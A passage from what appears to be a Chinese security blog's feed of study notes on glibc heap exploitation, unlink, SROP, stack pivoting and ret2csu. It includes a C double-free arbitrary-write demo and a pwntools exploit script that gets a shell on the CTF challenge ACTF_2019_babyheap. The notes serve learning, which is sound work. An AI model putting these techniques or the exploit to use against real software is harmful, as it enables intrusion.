class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考链接：<a href="https://blog.csdn.net/qq_53287512/article/details/127865920">https://blog.csdn.net/qq_53287512/article/details/127865920</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆溢出(二)</title>
      <link href="/2024/09/22/er-jin-zhi-an-quan/dui-yi-chu/dui-yi-chu-er/"/>
      <url>/2024/09/22/er-jin-zhi-an-quan/dui-yi-chu/dui-yi-chu-er/</url>
      
        <content type="html"><![CDATA[<h2 id="1-malloc"><a href="#1-malloc" class="headerlink" title="1.malloc"></a>1.malloc</h2><h2 id="2-free"><a href="#2-free" class="headerlink" title="2.free"></a>2.free</h2><h2 id="3-calloc"><a href="#3-calloc" class="headerlink" title="3.calloc"></a>3.calloc</h2><p>分配所需的内存空间，并返回一个（一组）指向它（它们）的指针。</p><p><strong><code>malloc和calloc</code>之间的不同点是，<code>malloc</code>不会设置内存为0，而<code>calloc</code>会设置分配的内存为0</strong></p><h2 id="4-realloc"><a href="#4-realloc" class="headerlink" title="4.realloc"></a>4.realloc</h2><p>更改已经配置的内存空间，即更改由<code>malloc</code>函数分配的内存空间的大小。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span>   <span class="token comment">//ptr指向堆块或者为空</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>如果重新申请的大小大于申请内存的大小，且当前内存段后面有需要的内存空间，则直接扩展这段内存空间，<code>realloc()</code>将返回原指针。</li><li>如果重新申请的大小大于申请内存的大小，<strong>且当前内存段后面的空闲字节不够</strong>，那么就使用堆中的第一个能够满足这一要求的内存块，<strong>将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置，</strong>相当于<code>free()+malloc()</code>。</li><li>如果重新申请的大小小于申请内存的大小，堆块会直接缩小，被削减的内存会释放（直接释放到<code>top chunk</code>中）。</li><li>如果传入了一个空的堆块地址，但是<code>size</code>不是0，就相当于<code>malloc()</code></li><li>如果传入了一个正常的堆块地址，但是<code>size</code>是0，那么就相当于<code>free()</code></li><li>如果申请失败，将返回<code>NULL</code>，此时，原来的指针仍然有效。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制安全, 堆溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/2024/09/21/er-jin-zhi-an-quan/dui-yi-chu/unlink/"/>
      <url>/2024/09/21/er-jin-zhi-an-quan/dui-yi-chu/unlink/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>俗称脱链，就是将链表头处的<code>free</code>堆块从<code>unsorted bin</code>中脱离出来，然后和物理地址相邻的新<code>free</code>的堆块合并成大堆块（向前合并或者向后合并），再放入到<code>unsorted bin</code>中。</p><p><strong>把两个<code>free</code>掉的物理相邻的两个堆块合并成一个大堆块，再放到<code>unsored bin</code>中。</strong></p><h2 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h2><ol><li><strong>通过修改标志位来实现<code>free</code>状态的堆块的伪造。</strong></li><li><strong>伪造<code>fd</code>指针和<code>bk</code>指针</strong>，<code>fd=p-0x18   bk=p-0x10</code></li></ol><p>通过伪造<code>free</code>状态的<code>fake_chunk</code>，伪造<code>fd</code>指针和<code>bk</code>指针，通过绕过<code>unlink</code>的检测实现<code>unlink</code>，<code>unlink</code>就会往<code>p</code>所在的位置写入<code>p-0x18</code>，从而实现任意地址写的漏洞。</p><p><img src="/2024/09/21/er-jin-zhi-an-quan/dui-yi-chu/unlink/image-20240921175445794.png" alt="image-20240921175445794"></p><p><img src="/2024/09/21/er-jin-zhi-an-quan/dui-yi-chu/unlink/image-20240921184727716.png" alt="image-20240921184727716"></p><h2 id="3-漏洞产生原因"><a href="#3-漏洞产生原因" class="headerlink" title="3.漏洞产生原因"></a>3.漏洞产生原因</h2><p><code>Offbynull、offbyone</code>(溢出单字节)、堆溢出，修改了堆块的使用标志位。</p><h2 id="4-Unlink的绕过和利用"><a href="#4-Unlink的绕过和利用" class="headerlink" title="4.Unlink的绕过和利用"></a>4.Unlink的绕过和利用</h2><h3 id="1-伪造如下"><a href="#1-伪造如下" class="headerlink" title="1.伪造如下"></a>1.伪造如下</h3><p><img src="/2024/09/21/er-jin-zhi-an-quan/dui-yi-chu/unlink/image-20240928145047258.png" alt="image-20240928145047258"></p><h3 id="2-绕过技巧"><a href="#2-绕过技巧" class="headerlink" title="2.绕过技巧"></a>2.绕过技巧</h3><p>即伪造<code>fd和bk</code>，让本来要合并的两个物理地址相邻的堆块变得不相邻而不会合并，即绕过<code>unlink</code>。</p><p><img src="/2024/09/21/er-jin-zhi-an-quan/dui-yi-chu/unlink/image-20240928151738531.png" alt="image-20240928151738531"></p><p>参考链接：<a href="https://www.freebuf.com/articles/system/288950.html">https://www.freebuf.com/articles/system/288950.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制安全, 堆溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SROP</title>
      <link href="/2024/09/04/er-jin-zhi-an-quan/zhan-yi-chu/srop/"/>
      <url>/2024/09/04/er-jin-zhi-an-quan/zhan-yi-chu/srop/</url>
      
        <content type="html"><![CDATA[<h2 id="1-S-Signal-ROP漏洞原理"><a href="#1-S-Signal-ROP漏洞原理" class="headerlink" title="1.S(Signal)ROP漏洞原理"></a>1.S(Signal)ROP漏洞原理</h2><p>在进行系统调用时，内核会保存断点信息，主要是将所有寄存器压入栈中，以及压入<code>signal</code>信息，以及指向<code>sigreturn</code>的系统调用地址。我们称<code>ucontext</code>和<code>siginfo</code>这一段为<code>signal frame</code>，这一部分是在用户进程的地址空间的。</p><p><img src="/2024/09/04/er-jin-zhi-an-quan/zhan-yi-chu/srop/image-20240904174552497.png" alt="image-20240904174552497"></p><p>之后会跳转到<code>signal handler</code>中处理相应的<code>signal</code>，<code>signal handler</code>处理完后，就会执行<code>sigreturn</code>代码。</p><p><img src="/2024/09/04/er-jin-zhi-an-quan/zhan-yi-chu/srop/image-20240904172201910.png" alt="image-20240904172201910"></p><p>所以漏洞利用原理就是通过伪造<code>Signal Frame</code>来控制<code>rax rdi rsi rdx</code>寄存器的值，最后将<code>rip</code>指向<code>syscall</code>，来达到执行我们想要执行的函数的目的，然后调用<code>sigreturn</code>控制程序执行流程</p><p><img src="/2024/09/04/er-jin-zhi-an-quan/zhan-yi-chu/srop/image-20240904184524475.png" alt="image-20240904184524475"></p><p><code>伪造signal frame控制寄存器以执行函数--&gt;signal handler处理signal--&gt;执行sigreturn系统调用(包括之前压入栈的寄存器)</code>，也就是在上图中<code>ucontext save</code>保存进程断点时通过伪造<code>signal frame</code>把寄存器的值改掉，然后在<code>ucontext restore</code>恢复进程上下文的时候把我们伪造的寄存器值返回到进程中去，从而达到攻击目的，获取<code>shell</code></p><p><img src="/2024/09/04/er-jin-zhi-an-quan/zhan-yi-chu/srop/image-20240904173238778.png" alt="image-20240904173238778"></p><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><p><img src="/2024/09/04/er-jin-zhi-an-quan/zhan-yi-chu/srop/image-20240904173337160.png" alt="image-20240904173337160"></p><p><img src="/2024/09/04/er-jin-zhi-an-quan/zhan-yi-chu/srop/image-20240904185429656.png" alt="image-20240904185429656"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制安全,栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移</title>
      <link href="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/"/>
      <url>/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h2><p>原理：栈迁移实际上是解决当原始栈可读入字符串长度不够的情况下<code>rop链</code>往哪儿写的问题，因为<code>rop链</code>必须借助栈溢出来达到攻击手段，所以<code>rop链</code>必须写在栈上，所以我们需要改变<code>rsp</code>的值来改变栈帧为能容纳<code>rop链</code>的那块区域。</p><p><img src="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/image-20240903113700758.png" alt="image-20240903113700758"></p><h2 id="2-利用方式"><a href="#2-利用方式" class="headerlink" title="2.利用方式"></a>2.利用方式</h2><h3 id="1-pop-rsp"><a href="#1-pop-rsp" class="headerlink" title="1.pop rsp"></a>1.pop rsp</h3><p><img src="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/image-20240903113850415.png" alt="image-20240903113850415"></p><h3 id="2-leave-ret"><a href="#2-leave-ret" class="headerlink" title="2.leave ret"></a>2.leave ret</h3><p><img src="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/image-20240903113918379.png" alt="image-20240903113918379"></p><h3 id="3-利用xchg"><a href="#3-利用xchg" class="headerlink" title="3.利用xchg"></a>3.利用xchg</h3><p> <code>xchg</code>是交换指令，在<code>gdb</code>里<code>search xchg</code>,找到该指令的<code>gadget</code>片段，利用 将<code>rsp</code>和其他寄存器的值进行交换的指令，来控制这个寄存器的值从而控制<code>rsp</code>的值来达到栈迁移的目的。</p><p><code>search xchg % rsp</code>  或者  <code>search mov % rsp</code></p><h2 id="3-案例"><a href="#3-案例" class="headerlink" title="3.案例"></a>3.案例</h2><p><img src="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/zhan-qian-yi/image-20240903202935442.png" alt="image-20240903202935442"></p><p>这段<code>exp</code>太抽象了，理解起来很不容易，多次进行栈迁移。</p><p>总之，要在新的区域构造<code>rop链</code>，就要修改<code>rsp</code>把栈迁移过去。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制安全,栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2csu</title>
      <link href="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/ret2csu/"/>
      <url>/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/ret2csu/</url>
      
        <content type="html"><![CDATA[<h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h2><p><code>ret2csu</code>就是指利用<code>glibc</code>编译出的程序中普遍存在的一个函数<code>__libc_csu_init</code>，来当作万能的<code>gadget</code>控制函数的参数的。</p><p>在想要构造<code>rop</code>链但没有<code>pop rdi|rsi|rdx;ret</code>时可以考虑通过<code>ret2csu</code>控制<code>rdi rsi rdx</code>的值。</p><p>因为<code>__libc_csu_init</code>会把<code>r15,r14,r13</code>的值<code>mov</code>给<code>rdi,rsi,rdx</code>，以及会 <code>call [r12+rbx*8]</code>，所以我们可以通过栈溢出覆盖掉<code>r15,r14,r13,rbx,rbp</code>的值来达到控制寄存器的目的。</p><h2 id="2-利用原理"><a href="#2-利用原理" class="headerlink" title="2.利用原理"></a>2.利用原理</h2><p><img src="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/ret2csu/image-20240903102226839.png" alt="image-20240903102226839"></p><p>具体构造的payload还是要看<code>__libc_csu_init</code>函数中的汇编指令。</p><h2 id="3-案例"><a href="#3-案例" class="headerlink" title="3.案例"></a>3.案例</h2><p><img src="/2024/09/03/er-jin-zhi-an-quan/zhan-yi-chu/ret2csu/image-20240903111626964.png" alt="image-20240903111626964"></p><p><code>def csu(rdi期望的值,rsi期望的值,rdx期望的值,期望执行的函数)</code>  </p><p> <code>write(1,buf_addr,size)</code></p><p>原理：</p><ol><li>泄露出程序已存在的<code>write</code>函数的真实地址，然后可以得到<code>lic_base</code>，得到<code>system_addr</code></li><li>然后调用<code>read</code>函数向<code>bss</code>段写入内容，直接<code>elf.bss(0x500)</code>即为写入内容的地址处</li><li>先写入<code>system_addr--&gt;elf.bss(0x500)</code>，然后写入<code>/bin/sh--&gt;elf.bss(0x500)+8</code></li><li>然后通过<code>ret2csu</code>调用<code>system</code>函数(<code>elf.bss(0x500)</code>)执行<code>/bin/sh</code>(<code>elf.bss(0x500)</code>+8)</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制安全,栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>re正则</title>
      <link href="/2024/09/01/web-an-quan/re-zheng-ze/"/>
      <url>/2024/09/01/web-an-quan/re-zheng-ze/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/09/01/web-an-quan/re-zheng-ze/image-20240901183642721.png" alt="image-20240901183642721"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆溢出(一)</title>
      <link href="/2024/08/11/er-jin-zhi-an-quan/dui-yi-chu/dui-yi-chu-yi/"/>
      <url>/2024/08/11/er-jin-zhi-an-quan/dui-yi-chu/dui-yi-chu-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="1-fast-bin-attack"><a href="#1-fast-bin-attack" class="headerlink" title="1.fast bin attack"></a>1.fast bin attack</h2><p><code>double free</code> 漏洞</p><ul><li>攻击目的：实现向栈上写入数据</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//分配了ptr原本指向的地址的free chunk</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//分配掉p原本指向的地址处的free chunk</span>    <span class="token comment">//此时bin中还存放着原本ptr指向的地址</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//向a中写入一个我们想要篡改其内容的地址减去两个字节(因为fd指向chunk的最开始的地址，而在我们可以写入的空间上面还有prev_size和size两个字长的数据)，但因为bin中也有这个地址处的内存，所以会使得fd指针指向这里所写入的地址，标记为下一块free chunk，如果写入一个栈上的地址，则bin中就会链接一个栈上的内存为free chunk</span>    <span class="token keyword">void</span> <span class="token operator">*</span> b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配的是上面写入的栈地址处的一块栈上的内存</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//实现任意地址写入</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>漏洞原理</strong>：两次<code>free</code>相同的地址空间，使得<code>bin</code>连接了两块相同的地址空间。</p><p><img src="/2024/08/11/er-jin-zhi-an-quan/dui-yi-chu/dui-yi-chu-yi/image-20240811154104342.png" alt="image-20240811154104342"></p><h2 id="2-unsorted-bin-attack"><a href="#2-unsorted-bin-attack" class="headerlink" title="2.unsorted bin attack"></a>2.unsorted bin attack</h2><p>一般利用它为<code>fast bin attack</code>创造攻击环境。</p><ul><li><p>攻击目的：将限制<code>fast bin</code>可链接<code>chunk</code>大小的变量篡改为一个很大的值(<code>unsorted bin</code>的地址)。</p></li><li><p>原理：将<code>unsorted bin</code>中仅存的一块<code>chunk</code>的<code>bk</code>指针篡改为我们期望修改的栈上的一个变量的地址，然后<code>malloc</code>掉这块<code>chunk</code>，这时<code>unsorted bin</code>为空，它就会主动地寻找被<code>malloc</code>掉的这块<code>chunk</code>的<code>bk</code>所指向的地址，将其链接到<code>unsorted bin</code>中，这时就把栈上我们所期望修改的变量的地址链接到了<code>unsorted bin</code>中作为新的<code>chunk</code>—&gt;<code>new_chunk</code>，<code>new_chunk</code>的<code>bk</code>指针也会指向<code>unsorted bin</code>的地址，由于<code>unsorted bin</code>是存储在<code>libc</code>中数据段上的，它的地址非常大，而<code>new_chunk</code>同时又是存储在栈上的一块数据，所以<code>bk</code>内容也属于这个变量的数据区域，从而就会使这个变量变得非常大。</p></li><li><p>攻击手段：于是我们通常将限制<code>fast bin</code>最大内存的变量作为我们期望修改的变量，将其值改为<code>unsorted bin</code>的地址这么一个很大的值，从而实现后续的<code>free chunk</code>都能被链接到<code>fast bin</code>中，然后我们就可以利用<code>fast bin attack</code>来进行任意地址写入了。</p></li></ul><p><img src="/2024/08/11/er-jin-zhi-an-quan/dui-yi-chu/dui-yi-chu-yi/image-20240811162517223.png" alt="image-20240811162517223"></p><h2 id="3-top-chunk-attack"><a href="#3-top-chunk-attack" class="headerlink" title="3.top chunk attack"></a>3.top chunk attack</h2><h3 id="3-1-house-of-force"><a href="#3-1-house-of-force" class="headerlink" title="3.1 house_of_force"></a>3.1 house_of_force</h3><ul><li>攻击目的：利用堆溢出，将<code>top chunk</code>的<code>size</code>篡改为非常非常大，使得之后<code>malloc</code>的时候可以分配到任意内存地址处的空间，从而篡改任意地址处的内容。</li><li>利用漏洞：堆溢出和<code>malloc</code>本身的整数溢出。通过<code>malloc</code>正数或负数去抬高<code>top chunk</code>的顶端或抬低<code>top chunk</code>的底端。</li></ul><h2 id="4-UAF-use-after-free"><a href="#4-UAF-use-after-free" class="headerlink" title="4.UAF(use after free)"></a>4.UAF(use after free)</h2><p>顾名思义，在<code>free</code>之后又调用，会造成内存泄漏。</p><p><strong>漏洞原理</strong>：在<code>free</code>掉内存后没有<code>free</code>指针。</p><p><img src="/2024/08/11/er-jin-zhi-an-quan/dui-yi-chu/dui-yi-chu-yi/image-20240813190603035.png" alt="image-20240813190603035"></p><h3 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a>ACTF_2019_babyheap</h3><h4 id="1-利用过程"><a href="#1-利用过程" class="headerlink" title="1.利用过程"></a>1.利用过程</h4><p><img src="/2024/08/11/er-jin-zhi-an-quan/dui-yi-chu/dui-yi-chu-yi/image-20240928115540039.png" alt="image-20240928115540039"></p><p>先申请两个堆块<code>A 和 B</code>，然后释放，这样两个结构体（大小为<code>0x10</code>）就会被放入<code>fastbin</code>中，然后再申请一个<code>0x10</code>的堆块，因为这道题中在申请堆块的时候除了会申请我们输入的<code>size</code>大小的堆块外，还是先自动分配一个<code>0x10</code>大小的<code>struct</code>堆块，所以<code>struct C </code>就会覆盖掉<code>struct B</code>所在的<code>fastbin</code>中的堆块，<code>content C</code>就会覆盖掉<code>structA</code>，因为A的结构体中有函数指针和<code>content</code>指针，所以可以把函数指针覆盖为<code>system</code>，把<code>content</code>指针覆盖为<code>/bin/sh</code>的地址，然后利用<code>show()</code>函数，就会调用函数指针，从而成功<code>getshell</code>。</p><p>####2.exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token comment">#p = remote('node5.buuoj.cn',29214)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>system <span class="token operator">=</span> <span class="token number">0x4007A0</span>bin_sh <span class="token operator">=</span> <span class="token number">0x602010</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"input content:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"list index:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"list index:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token operator">*</span><span class="token number">0x100</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(p)</span><span class="token comment">#pause()</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制安全,堆溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆管理器原理</title>
      <link href="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/"/>
      <url>/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240809192157483.png" alt="image-20240809192157483"></p><p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240913134039908.png" alt="image-20240913134039908"></p><p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240809194720572.png" alt="image-20240809194720572"></p><h2 id="获取堆空间的两种方式"><a href="#获取堆空间的两种方式" class="headerlink" title="获取堆空间的两种方式"></a>获取堆空间的两种方式</h2><p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240809192654350.png" alt="image-20240809192654350"></p><ol><li>主线程可以用<code>brk</code>，也可以用<code>mmap</code></li><li>子线程只能用<code>mmap</code></li><li>主线程如果申请的区域过大的话，会直接用<code>mmap</code>在<code>mmap</code>段拿到一段大的空间，如果申请的比较小的话，就直接用<code>brk</code>在<code>data</code>段上面扩展一段空间就可以了。</li></ol><h2 id="三个关键词"><a href="#三个关键词" class="headerlink" title="三个关键词"></a>三个关键词</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>每个线程都会分配一个<code>arena</code></p><p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240809201019193.png" alt="image-20240809201019193"></p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>用户申请内存的单位，也是堆管理器管理内存的基本单位，<code>malloc()</code>返回的指针指向一个<code>chunk</code>的数据区域。</p><p><strong><code>malloc</code>申请的一片内存区域就称为<code>chunk</code></strong></p><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc chunk"></a>malloc chunk</h4><p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240810101450041.png" alt="image-20240810101450041"></p><h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>指针被<code>free</code>掉之后堆管理器并不会将内存上的数据真的擦除，而只是将此<code>malloc chunk</code>标记为<code>free chunk</code>，这也会造成内存泄露漏洞。</p><p><code>small bin free chunk</code> 和 <code>unsorted bin chunk</code></p><p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240810162328903.png" alt="image-20240810162328903"></p><p><strong>large bin</strong><code>free chunk</code></p><p><code>P</code>标志位：0为<code>free chunk</code>，1为<code>malloc chunk</code></p><p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240810110549820.png" alt="image-20240810110549820"></p><p><strong>fast bin</strong> <code>free chunk</code>的P信息位会一直为1，是为了避免被其他的<code>free chunk</code>合并</p><p><img src="/2024/08/09/er-jin-zhi-an-quan/dui-yi-chu/dui-guan-li-qi-yuan-li/image-20240810110514105.png" alt="image-20240810110514105"></p><ul><li><p>最小的<code>chunk</code>被<code>free</code>掉之后会优先放到<code>fast bin</code>中。</p></li><li><p><code>chunk</code>是<code>8B</code>对齐，页是<code>4KB</code>对齐</p></li><li><p><code>x64</code>下最小的<code>chunk</code>大小是<code>0x20</code>，<code>x86</code>下最小的<code>chunk</code>大小是<code>0x10</code></p></li></ul><h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>管理堆管理器分配的剩余空间的大小，即堆管理器向操作系统申请的空间未被使用过的内存，即<code>arena-mallocted chunk - free chunk</code>的内存。</p><h4 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h4><p>一块<code>free chunk</code>被分配后剩余的碎片空间。之后会被放入为<code>unsorted bin</code>中。</p><h3 id="bin-垃圾桶-回收站"><a 